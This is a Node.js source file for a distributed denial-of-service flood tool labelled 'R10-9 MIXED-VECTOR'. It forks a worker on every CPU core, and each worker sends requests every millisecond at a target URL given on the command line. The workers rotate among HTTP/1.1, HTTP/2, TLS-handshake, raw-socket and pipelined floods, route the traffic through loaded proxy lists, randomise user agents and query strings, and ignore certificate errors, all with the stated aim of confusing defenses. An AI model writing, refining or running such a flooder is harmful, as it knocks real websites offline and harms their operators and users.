// R10-9: MIXED-VECTOR - Combined Attack Methods
// Focus: Confuse defense systems
// Technique: Rotate between all attack vectors

const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Load proxies and user agents
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-9] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-9] No proxy.txt found, running without proxies');
}

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    console.log(`[R10-9] Loaded ${userAgents.length} user agents`);
} catch (e) {}

const methods = ['http1', 'http2', 'tls', 'raw', 'pipeline'];

if (cluster.isMaster) {
    console.log(`[R10-9] MIXED-VECTOR launching on ${CPU_CORES} cores`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = new URL(process.argv[2]);
    const time = process.argv[3] || 300;
    
    let requestCount = 0;
    let methodCounts = {};
    
    const interval = setInterval(() => {
        const method = methods[Math.floor(Math.random() * methods.length)];
        
        switch(method) {
            case 'http1':
                sendHTTP1(target);
                break;
            case 'http2':
                sendHTTP2(target);
                break;
            case 'tls':
                sendTLS(target);
                break;
            case 'raw':
                sendRaw(target);
                break;
            case 'pipeline':
                sendPipeline(target);
                break;
        }
        
        methodCounts[method] = (methodCounts[method] || 0) + 1;
        requestCount++;
    }, 1);
    
    function sendHTTP1(target) {
        try {
            if (proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                const [proxyHost, proxyPort] = proxy.split(':');
                
                const options = {
                    hostname: proxyHost,
                    port: parseInt(proxyPort),
                    method: 'CONNECT',
                    path: `${target.hostname}:443`
                };
                
                const req = http.request(options);
                req.on('connect', (res, socket) => {
                    const ua = userAgents.length > 0 
                        ? userAgents[Math.floor(Math.random() * userAgents.length)]
                        : 'Mozilla/5.0';
                    
                    const tlsSocket = tls.connect({
                        socket: socket,
                        servername: target.hostname,
                        rejectUnauthorized: false
                    }, () => {
                        tlsSocket.write(`GET ${target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`);
                        setTimeout(() => tlsSocket.destroy(), 100);
                    });
                });
                req.end();
            } else {
                // Direct HTTP/1.1
                const ua = userAgents.length > 0 
                    ? userAgents[Math.floor(Math.random() * userAgents.length)]
                    : 'Mozilla/5.0';
                
                const options = {
                    hostname: target.hostname,
                    port: 443,
                    path: target.pathname + '?' + Math.random(),
                    method: 'GET',
                    headers: {
                        'Host': target.hostname,
                        'User-Agent': ua,
                        'Connection': 'close'
                    },
                    rejectUnauthorized: false
                };
                
                const req = https.request(options, () => {});
                req.on('error', () => {});
                req.end();
            }
        } catch (e) {}
    }
    
    function sendHTTP2(target) {
        try {
            const ua = userAgents.length > 0 
                ? userAgents[Math.floor(Math.random() * userAgents.length)]
                : 'Mozilla/5.0';
            
            const session = http2.connect(target.origin, { rejectUnauthorized: false });
            const headers = {
                ':path': target.pathname + '?' + Math.random(),
                'user-agent': ua
            };
            const req = session.request(headers);
            req.on('response', () => req.close());
            req.end();
            setTimeout(() => session.destroy(), 100);
        } catch (e) {}
    }
    
    function sendTLS(target) {
        try {
            if (proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                const [proxyHost, proxyPort] = proxy.split(':');
                
                const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                    socket.write(`CONNECT ${target.hostname}:443 HTTP/1.1\r\nHost: ${target.hostname}:443\r\n\r\n`);
                    
                    socket.once('data', () => {
                        const tlsSocket = tls.connect({
                            socket: socket,
                            servername: target.hostname,
                            rejectUnauthorized: false
                        }, () => {
                            tlsSocket.destroy();
                        });
                    });
                });
            } else {
                const socket = tls.connect(443, target.hostname, {
                    rejectUnauthorized: false,
                    servername: target.hostname
                }, () => socket.destroy());
            }
        } catch (e) {}
    }
    
    function sendRaw(target) {
        try {
            if (proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                const [proxyHost, proxyPort] = proxy.split(':');
                
                const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                    socket.write(`CONNECT ${target.hostname}:443 HTTP/1.1\r\nHost: ${target.hostname}:443\r\n\r\n`);
                    
                    socket.once('data', () => {
                        const ua = userAgents.length > 0 
                            ? userAgents[Math.floor(Math.random() * userAgents.length)]
                            : 'Mozilla/5.0';
                        
                        socket.write(`GET ${target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`);
                        setTimeout(() => socket.destroy(), 100);
                    });
                });
            } else {
                const socket = net.connect(443, target.hostname, () => {
                    const ua = userAgents.length > 0 
                        ? userAgents[Math.floor(Math.random() * userAgents.length)]
                        : 'Mozilla/5.0';
                    
                    socket.write(`GET ${target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`);
                    setTimeout(() => socket.destroy(), 100);
                });
            }
        } catch (e) {}
    }
    
    function sendPipeline(target) {
        try {
            if (proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                const [proxyHost, proxyPort] = proxy.split(':');
                
                const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                    socket.write(`CONNECT ${target.hostname}:443 HTTP/1.1\r\nHost: ${target.hostname}:443\r\n\r\n`);
                    
                    socket.once('data', () => {
                        const ua = userAgents.length > 0 
                            ? userAgents[Math.floor(Math.random() * userAgents.length)]
                            : 'Mozilla/5.0';
                        
                        let pipelined = '';
                        for (let i = 0; i < 10; i++) {
                            pipelined += `GET ${target.pathname}?${Math.random() + i} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`;
                        }
                        socket.write(pipelined);
                        setTimeout(() => socket.destroy(), 100);
                    });
                });
            } else {
                const socket = net.connect(443, target.hostname, () => {
                    const ua = userAgents.length > 0 
                        ? userAgents[Math.floor(Math.random() * userAgents.length)]
                        : 'Mozilla/5.0';
                    
                    let pipelined = '';
                    for (let i = 0; i < 10; i++) {
                        pipelined += `GET ${target.pathname}?${Math.random() + i} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`;
                    }
                    socket.write(pipelined);
                    setTimeout(() => socket.destroy(), 100);
                });
            }
        } catch (e) {}
    }
    
    setInterval(() => {
        console.log(`[R10-9] Total RPS: ${requestCount}`);
        console.log('Methods:', methodCounts);
        requestCount = 0;
        methodCounts = {};
    }, 1000);
    
    setTimeout(() => {
        clearInterval(interval);
        process.exit(0);
    }, time * 1000);
}